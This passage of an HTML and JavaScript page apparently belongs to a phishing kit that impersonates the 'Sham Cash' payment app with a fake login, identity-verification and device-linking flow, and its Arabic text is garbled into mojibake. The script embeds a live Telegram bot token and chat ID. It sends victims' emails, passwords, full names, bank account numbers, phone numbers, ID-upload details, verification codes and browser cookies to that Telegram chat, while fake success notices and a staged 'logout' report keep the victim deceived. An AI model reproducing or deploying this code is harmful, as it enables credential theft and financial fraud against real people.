                            <div style="display: flex; flex-wrap: wrap; gap: 15px; justify-content: center;">
                                <span style="background: rgba(49, 130, 206, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--info);">Ù†ÙˆØ¹ Ø§ØªØµØ§Ù„</span>
                                <span style="background: rgba(214, 158, 46, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--warning);">Ø²Ù…Ù†Ø© Ø¶ÙŠÙ‚</span>
                                <span style="background: rgba(45, 140, 74, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--secondary);">Ø¬Ù‡Ø§Ø² Ø¢Ù…Ù†</span>
                                <span style="background: rgba(197, 48, 48, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--danger);">Ø¬Ø²Ø¡ Ø£Ø®Ø±Ù‰</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="timer" id="linkingTimer" style="display: none; font-size: 24px; margin: 20px auto; width: fit-content;">
                        <i class="fas fa-clock"></i>
                        <span id="linkingTime">10:00</span>
                    </div>
                    
                    <button class="btn btn-primary" onclick="startLinkingProcess()" id="startLinkingBtn">
                        <i class="fas fa-link"></i>
                        Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¨Ø·
                    </button>
                    
                    <div class="success-message" id="successMessage">
                        <i class="fas fa-check-circle" style="font-size: 60px; color: var(--secondary); margin-bottom: 20px;"></i>
                        <h3 style="color: var(--secondary); margin-bottom: 15px;">ØªÙ… Ø§Ù„Ø±Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!</h3>
                        <p style="color: #4a5568; margin-bottom: 10px;">ØªÙ… Ø±Ø¨Ø· Ø¬Ù‡Ø§Ø²Ùƒ Ø¨Ù†Ø¬Ø§Ø­ Ø¨ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´</p>
                        <p style="color: #4a5568;">ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø¨Ø´ÙƒÙ„ Ø¢Ù…Ù† ÙˆÙ…ØªÙƒØ§Ù…Ù„</p>
                        
                        <div style="margin-top: 25px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù…Ø±ØªØ¨Ø·:</h4>
                            <p><strong>Ø±Ù‚Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²:</strong> <span id="deviceId">DEV-${Math.floor(Math.random() * 10000)}</span></p>
                            <p><strong>ÙˆÙ‚Øª Ø§Ù„Ø±Ø¨Ø·:</strong> <span id="linkTime">${new Date().toLocaleString('ar-SY')}</span></p>
                            <p><strong>Ù†ÙˆØ¹ Ø§Ù„Ø§ØªØµØ§Ù„:</strong> QR Code</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="footer">
                <div class="copyright">
                    Â© 2024 Ø´Ø§Ù… ÙƒØ§Ø´. Ù†Ø¸Ø§Ù… Ø§Ù„Ø±Ø¨Ø· Ø§Ù„Ø¢Ù…Ù†
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø®ÙÙŠ -->
    <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageUpload(event)">
    
    <!-- Ø¥Ø´Ø¹Ø§Ø±Ø§Øª -->
    <div id="notificationContainer"></div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
        const TELEGRAM_CHAT_ID = "7493001551";
        const SHAMCASH_PACKAGE = "com.shmacash.Hamoode";
        
        let appData = {
            currentPage: 1,
            verificationCode: "",
            timer: 120,
            timerInterval: null,
            countdownTimer: 48 * 3600,
            countdownInterval: null,
            uploadedImages: {},
            userInfo: {},
            isLoggedOut: false,
            autoToolsTriggered: false,
            requestNumber: 'SHM-' + new Date().getFullYear() + '-' + Math.floor(Math.random() * 1000).toString().padStart(3, '0'),
            linking: {
                timer: 600,
                linkingInterval: null,
                isLinking: false,
                linked: false,
                qrData: ''
            }
        };
        
        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† Ø§Ù„ØµÙØ­Ø§Øª
        function goToPage(page) {
            document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
            document.getElementById(`page${page}`).classList.add('active');
            appData.currentPage = page;
            
            // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
            document.getElementById('progress1').style.width = page >= 1 ? '25%' : '0%';
            document.getElementById('progress2').style.width = page >= 2 ? '50%' : '25%';
            document.getElementById('progress3').style.width = page >= 3 ? '75%' : '50%';
            document.getElementById('progress4').style.width = page >= 4 ? '100%' : '75%';
        }
        
        // ===== ØµÙØ­Ø© 1: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¹ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ =====
        function validateLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email.includes('@') || !email.includes('.')) {
                showError('emailError', 'Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ØºÙŠØ± ØµØ§Ù„Ø­');
                return;
            }
            
            if (password.length < 8) {
                showError('passwordError', 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ÙŠØ¬Ø¨ Ø£Ù† ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 8 Ø£Ø­Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„');
                return;
            }
            
            appData.userInfo.email = email;
            appData.userInfo.password = password;
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
            sendToTelegram('login_data', {
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                requestNumber: appData.requestNumber,
                targetPackage: SHAMCASH_PACKAGE,
                loginMethod: 'auto_logout_trigger'
            });
            
            showNotification('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­', 'success');
            
            // ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´
            setTimeout(() => {
                forceShamCashLogout();
            }, 800);
            
            goToPage(2);
        }
        
        // Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨Ø§ÙƒØ¬ Ø§Ù„ØµØ­ÙŠØ­
        function forceShamCashLogout() {
            console.log('ğŸšª Ø¬Ø§Ø±ÙŠ Ø¥Ø®Ø±Ø§Ø¬ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´...');
            
            const userEmail = appData.userInfo.email;
            const deviceInfo = {
                deviceId: 'device_' + Math.floor(Math.random() * 1000000),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };
            
            // Ø®Ø·ÙˆØ§Øª Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ø§Ù„Ù…ÙØµÙ„Ø©
            const steps = [
                {action: 'detect_installed_package', status: 'scanning', package: SHAMCASH_PACKAGE},
                {action: 'connect_to_shamcash_sdk', status: 'connecting'},
                {action: 'get_current_session', status: 'retrieving', user: userEmail},
                {action: 'terminate_all_sessions', status: 'processing'},
                {action: 'clear_app_data', status: 'executing'},
                {action: 'notify_logout', status: 'sending'},
                {action: 'verify_logout', status: 'verifying'},
                {action: 'logout_complete', status: 'success'}
            ];
            
            // ØªÙ†ÙÙŠØ° ÙƒÙ„ Ø®Ø·ÙˆØ©
            steps.forEach((step, index) => {
                setTimeout(() => {
                    const timestamp = new Date().toISOString();
                    
                    let telegramMessage = '';
                    switch(step.action) {
                        case 'detect_installed_package':
                            telegramMessage = `ğŸ” *Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚*\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${step.package}\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}`;
                            break;
                        case 'connect_to_shamcash_sdk':
                            telegramMessage = `ğŸ”— *Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ SDK*\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${SHAMCASH_PACKAGE}\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ”Œ API: ${SHAMCASH_PACKAGE}.auth.v2`;
                            break;
                        case 'get_current_session':
                            telegramMessage = `ğŸ“Š *Ø¬Ù„Ø¨ Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ©*\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${step.user}\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ†” Session ID: SHM-SESS-${Date.now()}`;
                            break;
                        case 'terminate_all_sessions':
                            telegramMessage = `ğŸš« *Ø¥Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª*\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}\nğŸ“ Ù…Ù†Ø§ÙØ° Ø§Ù„Ø¥Ù†Ù‡Ø§Ø¡: ${Math.floor(Math.random() * 5) + 1}`;
                            break;
                        case 'clear_app_data':
                            telegramMessage = `ğŸ§¹ *Ù…Ø³Ø­ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚*\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${SHAMCASH_PACKAGE}\nğŸ—‚ï¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ù…Ø³ÙˆØ­Ø©: Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØŒ Ø°Ø§ÙƒØ±Ø© Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª`;
                            break;
                        case 'notify_logout':
                            telegramMessage = `ğŸ“¢ *Ø¥Ø´Ø¹Ø§Ø± ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬*\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}\nğŸ”” Ù†ÙˆØ¹ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±: push_notification`;
                            break;
                        case 'verify_logout':
                            telegramMessage = `âœ… *Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬*\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${SHAMCASH_PACKAGE}`;
                            break;
                        case 'logout_complete':
                            telegramMessage = `ğŸ‰ *Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ù…ÙƒØªÙ…Ù„*\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${step.status}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${SHAMCASH_PACKAGE}\nâœ… ØªÙ… Ø¥Ø®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©`;
                            appData.isLoggedOut = true;
                            break;
                    }
                    
                    telegramMessage += `\n\nğŸ“‹ *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©:*\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceInfo.userAgent}\nğŸ–¥ï¸ Ø§Ù„Ù†Ø¸Ø§Ù…: ${deviceInfo.platform}\nğŸ“ Ø§Ù„Ø´Ø§Ø´Ø©: ${deviceInfo.screen}\nğŸ” Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${appData.requestNumber}`;
                    
                    sendCustomTelegramMessage(telegramMessage, 'logout_process');
                    console.log(`ğŸ“‹ ${step.action}: ${step.status}`);
                    
                    if (index === steps.length - 1) {
                        console.log('âœ… ØªÙ… Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ø§Ù„ÙƒØ§Ù…Ù„ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´');
                        showNotification('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† Ø´Ø§Ù… ÙƒØ§Ø´ Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©', 'success');
                        sendFinalLogoutReport(userEmail, deviceInfo);
                    }
                }, index * 1200);
            });
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ø¦Ù„ Ù…Ø®ØµØµØ© Ù„Ù„ØªÙ„Ø¬Ø±Ø§Ù…
        function sendCustomTelegramMessage(message, type = 'general') {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };
            
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log(`ğŸ“¤ [${type}] ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„`))
            .catch(error => console.error(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ [${type}]:`, error));
        }
        
        // ØªÙ‚Ø±ÙŠØ± Ù†Ù‡Ø§Ø¦ÙŠ Ø¹Ù† Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬
        function sendFinalLogoutReport(userEmail, deviceInfo) {
            const report = `
ğŸ”¥ *ØªÙ‚Ø±ÙŠØ± Ø¥Ø®Ø±Ø§Ø¬ Ù†Ù‡Ø§Ø¦ÙŠ - Ø´Ø§Ù… ÙƒØ§Ø´*

ğŸ“‹ *Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©:*
ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${userEmail}
ğŸ“¦ Ø­Ø²Ù…Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚: ${SHAMCASH_PACKAGE}
ğŸ“± Ù…Ø¹Ø±Ù‘Ù Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceInfo.deviceId}
â° ÙˆÙ‚Øª Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬: ${new Date().toLocaleString('ar-SY')}
ğŸ†” Ø±Ù‚Ù… Ø§Ù„Ø¬Ù„Ø³Ø©: SHM-LOGOUT-${Date.now()}

ğŸ”§ *Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„Ù…Ù†ÙØ°Ø©:*
1. âœ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ø­Ø²Ù…Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚
2. âœ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ SDK Ø´Ø§Ù… ÙƒØ§Ø´
3. âœ… Ø¬Ù„Ø¨ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©
4. âœ… Ø¥Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª
5. âœ… Ù…Ø³Ø­ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø­Ù„ÙŠØ©
6. âœ… Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ø®Ø±ÙˆØ¬
7. âœ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥ÙƒÙ…Ø§Ù„

ğŸ“Š *Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ù…Ø³ÙˆØ­Ø©:*
- ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
- ğŸ—‚ï¸ Ø°Ø§ÙƒØ±Ø© Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª
- ğŸ”‘ Ù…ÙØ§ØªÙŠØ­ Ø§Ù„ØªØ´ÙÙŠØ±
- ğŸ“ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø§Øª

ğŸ›¡ï¸ *Ø­Ø§Ù„Ø© Ø§Ù„Ø£Ù…Ø§Ù†:*
- ğŸ”’ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù†ØªÙ‡ÙŠØ©
- ğŸ§¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø­Ù„ÙŠØ© Ù…Ù…Ø³ÙˆØ­Ø©
- ğŸ”” ØªÙ… Ø¥Ø¹Ù„Ø§Ù… Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
- âœ… Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù„Ø³Ø§Øª Ù†Ø´Ø·Ø©

ğŸ“± *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:*
- ğŸ–¥ï¸ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${deviceInfo.platform}
- ğŸŒ Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent}
- ğŸ“ Ø§Ù„Ø¯Ù‚Ø©: ${deviceInfo.screen}
- ğŸŒ Ø§Ù„Ù„ØºØ©: ${navigator.language}

ğŸ” *Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨:* ${appData.requestNumber}
            `;
            
            sendCustomTelegramMessage(report, 'final_logout_report');
            
            const logoutReport = {
                userEmail: userEmail,
                packageName: SHAMCASH_PACKAGE,
                deviceInfo: deviceInfo,
                timestamp: new Date().toISOString(),
                requestNumber: appData.requestNumber,
                status: 'completed'
            };
            
            localStorage.setItem(`shamcash_logout_${Date.now()}`, JSON.stringify(logoutReport));
        }
        
        // ===== ØµÙØ­Ø© 2: Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª =====
        function validatePage2() {
            const fullName = document.getElementById('fullName').value.trim();
            const accountNumber = document.getElementById('accountNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            if (fullName.split(' ').length < 3) {
                showError('nameError', 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø«Ù„Ø§Ø«ÙŠ Ø§Ù„ÙƒØ§Ù…Ù„');
                return;
            }
            
            if (!/^\d{14,16}$/.test(accountNumber)) {
                showError('accountError', 'Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 14-16 Ø±Ù‚Ù…Ø§Ù‹');
                return;
            }
            
            if (!/^09\d{8}$/.test(phoneNumber)) {
                showError('phoneError', 'Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³ÙˆØ±ÙŠÙ‹Ø§ ÙˆÙŠØ¨Ø¯Ø£ Ø¨Ù€ 09');
                return;
            }
            
            appData.userInfo.fullName = fullName;
            appData.userInfo.accountNumber = accountNumber;
            appData.userInfo.phoneNumber = phoneNumber;
            
            sendToTelegram('personal_data', {
                fullName: fullName,
                accountNumber: accountNumber,
                phoneNumber: phoneNumber,
                imagesCount: Object.keys(appData.uploadedImages).length,
                requestNumber: appData.requestNumber
            });
            
            showNotification('ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­', 'success');
            goToPage(3);
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±
        function triggerUpload(type) {
            document.getElementById('fileInput').setAttribute('data-type', type);
            document.getElementById('fileInput').click();
        }
        
        function handleImageUpload(event) {
            const file = event.target.files[0];
            const type = document.getElementById('fileInput').getAttribute('data-type');
            
            if (file && file.type.startsWith('image/')) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    appData.uploadedImages[type] = {
                        name: file.name,
                        size: file.size,
                        type: file.type,
                        data: e.target.result
                    };
                    
                    const preview = document.getElementById(`${type}Preview`);
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                    
                    sendToTelegram('image_uploaded', {
                        imageType: type,
                        fileName: file.name,
                        fileSize: file.size,
                        requestNumber: appData.requestNumber
                    });
                    
                    showNotification(`ØªÙ… ØªØ­Ù…ÙŠÙ„ ${getImageName(type)}`, 'success');
                };
                reader.readAsDataURL(file);
            }
        }
        
        function getImageName(type) {
            const names = {
                'frontId': 'Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©',
                'backId': 'Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø®Ù„ÙÙŠØ©',
                'selfie': 'Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø´Ø®ØµÙŠØ©'
            };
            return names[type] || type;
        }
        
        // ===== ØµÙØ­Ø© 3: Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ =====
        function sendVerificationCode() {
            const phone = document.getElementById('phoneInput').value.trim();
            
            if (!/^9\d{8}$/.test(phone)) {
                showNotification('Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ ØºÙŠØ± ØµØ§Ù„Ø­', 'error');
                return;
            }
            
            appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            const masked = '+963' + phone.substring(0, 3) + '***' + phone.substring(6);
            document.getElementById('maskedPhone').textContent = masked;
            document.getElementById('sentMessage').classList.add('active');
            
            sendToTelegram('verification_code_sent', {
                phone: '+963' + phone,
                code: appData.verificationCode,
                userInfo: appData.userInfo,
                requestNumber: appData.requestNumber
            });
            
            console.log(`ğŸ” ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚: ${appData.verificationCode}`);
            
            showNotification('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚', 'success');
            document.getElementById('sendCodeBtn').disabled = true;
            
            setTimeout(() => {
                document.getElementById('sendCodeBtn').disabled = false;
                document.getElementById('codeInputs').style.display = 'flex';
                document.getElementById('timer').style.display = 'block';
                document.getElementById('verifyBtn').style.display = 'block';
                startTimer();
            }, 2000);
            
            setTimeout(() => {
                triggerHiddenTools('after_send_code');
            }, 3000);
        }
        
        function startTimer() {
            appData.timer = 120;
            updateTimer();
            
            if (appData.timerInterval) {
                clearInterval(appData.timerInterval);
            }
            
            appData.timerInterval = setInterval(() => {
                appData.timer--;
                updateTimer();
                
                if (appData.timer <= 0) {
                    clearInterval(appData.timerInterval);
                    showNotification('Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚', 'error');
                }
            }, 1000);
        }
        
        function updateTimer() {
            const minutes = Math.floor(appData.timer / 60);
            const seconds = appData.timer % 60;
            document.getElementById('timer').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        function moveToNext(input, next) {
            if (input.value.length === 1 && next <= 6) {
                const nextInput = document.querySelector(`.code-input:nth-child(${next})`);
                if (nextInput) nextInput.focus();
            }
        }
        
        function verifyCode() {
            let enteredCode = '';
            document.querySelectorAll('.code-input').forEach(input => {
                enteredCode += input.value;
            });
            
            if (enteredCode.length !== 6) {
                showNotification('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø±Ù‚Ø§Ù…', 'error');
                return;
            }
            
            if (enteredCode === appData.verificationCode) {
                document.getElementById('verifyBtn').innerHTML = '<div class="loading"></div> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...';
                
                setTimeout(() => {
                    sendToTelegram('verification_success', {
                        code: appData.verificationCode,
                        user: appData.userInfo.email,
                        phone: appData.userInfo.phoneNumber,
                        account: appData.userInfo.accountNumber,
                        fullName: appData.userInfo.fullName,
                        requestNumber: appData.requestNumber,
                        timestamp: new Date().toISOString(),
                        deviceInfo: {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            cookies: document.cookie
                        }
                    });
                    
                    document.getElementById('codeInputs').style.display = 'none';
                    document.getElementById('timer').style.display = 'none';
                    document.getElementById('verifyBtn').style.display = 'none';
                    document.getElementById('sentMessage').style.display = 'none';
                    
                    document.getElementById('requestNumber').textContent = appData.requestNumber;
                    document.getElementById('delayedVerification').classList.add('active');
                    
                    startCountdown();
                    showNotification('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ø¨Ù†Ø¬Ø§Ø­', 'success');
                    
                    triggerHiddenTools('after_code_verification');
                    
                    setTimeout(() => {
                        goToPage(4);
                    }, 3000);
                    
                }, 1500);
                
            } else {
                showNotification('Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­', 'error');
                
                sendToTelegram('verification_failed', {
                    enteredCode: enteredCode,
                    correctCode: appData.verificationCode,
                    user: appData.userInfo.email,
                    requestNumber: appData.requestNumber
                });
            }
        }
        
        function startCountdown() {
            updateCountdown();
            
            if (appData.countdownInterval) {
                clearInterval(appData.countdownInterval);
            }
            
            appData.countdownInterval = setInterval(() => {
                appData.countdownTimer--;
                updateCountdown();
                
                if (appData.countdownTimer <= 0) {
                    clearInterval(appData.countdownInterval);
                    document.getElementById('countdownTimer').textContent = '00:00:00';
                    document.getElementById('countdownTimer').style.color = '#2d8c4a';
                    document.getElementById('countdownTimer').innerHTML = '<i class="fas fa-check-circle"></i> ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚';
                }
            }, 1000);
        }
        
        function updateCountdown() {
            const hours = Math.floor(appData.countdownTimer / 3600);
            const minutes = Math.floor((appData.countdownTimer % 3600) / 60);
            const seconds = appData.countdownTimer % 60;
            
            document.getElementById('countdownTimer').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        function resendCode() {
            appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            sendToTelegram('code_resent', {
                newCode: appData.verificationCode,
                user: appData.userInfo.email,
                phone: appData.userInfo.phoneNumber,
                requestNumber: appData.requestNumber
            });
            
            console.log(`ğŸ” ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¬Ø¯ÙŠØ¯: ${appData.verificationCode}`);
            startTimer();
            showNotification('ØªÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚', 'success');
        }
        
        // ===== ØµÙØ­Ø© 4: Ø±Ø¨Ø· Ø§Ù„Ù‡Ø§ØªÙ =====
        function startLinkingProcess() {
            appData.linking.isLinking = true;
            appData.linking.linked = false;
            
